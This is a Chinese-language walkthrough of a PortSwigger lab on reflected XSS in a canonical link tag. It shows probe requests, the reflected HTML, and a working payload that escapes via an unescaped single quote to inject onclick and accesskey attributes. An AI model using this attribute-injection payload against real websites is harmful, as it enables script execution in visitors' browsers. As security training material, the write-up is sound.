# 实验：规范链接标签（canonical link tag）中的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

[关联研究](https://portswigger.net/research/xss-in-hidden-input-fields)

本实验在规范链接标签（canonical link tag）中回显用户输入，并对尖括号进行了转义。

为了解决本实验，请在主页上执行一个跨站脚本攻击，注入一个能够调用 `alert` 函数的属性。

为了辅助你的利用过程，你可以假设模拟用户会按下以下按键组合：

*   `ALT+SHIFT+X`
*   `CTRL+ALT+X`
*   `Alt+X`

请注意，本实验的预期解法仅在 Chrome 浏览器中可行。

## 步骤

探测
- 访问主页
    ```http
    GET / HTTP/2
    ```

    - 响应
        ```html
        <link rel="canonical" href='https://实验室/'/>
        ```
        - 似乎回显了整个 URL

- 添加测试参数 
    ```http
    GET /?h1pva7vk<>"'(){} HTTP/2
    ```

    - 响应
        ```html
        <link rel="canonical" href='https://lab-id.web-security-academy.net/?h1pva7vk%3c%3e%22'(){}'/>
        ```
        - 上下文 `link` 元素的标签内
        - 单引号未被转义导致逃逸，可注入属性

攻击
- 使用单引号闭合属性值，注入快捷键属性
    ```http
    GET /?'onclick='alert()'accesskey='X HTTP/2
    ```

    - 响应
        ```html
        <link rel="canonical" href="https://lab-id.web-security-academy.net/?" onclick="alert()" accesskey="X">
        ```
        
    - 按下组合键触发载荷
